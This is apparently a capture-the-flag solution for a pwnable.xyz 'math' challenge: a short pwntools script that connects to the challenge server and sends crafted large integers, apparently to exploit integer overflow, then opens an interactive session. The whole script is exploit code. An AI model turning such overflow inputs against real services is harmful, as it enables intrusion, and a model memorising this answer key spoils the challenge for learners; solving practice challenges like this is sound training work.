数学题



```python
from pwn import *

p = remote('svc.pwnable.xyz', 30008)
# p = process('./challenge')
p.recvuntil(b'x:')
p.sendline(b'2147484985')
p.recvuntil(b'y:')
p.sendline(b'2147483648')

p.recvuntil(b'=== t00leet ===')
p.sendline(b'110601 38833')

p.recvuntil(b'=== 3leet ===')
p.sendline(b'0 0 0 0 0')

p.interactive()

```

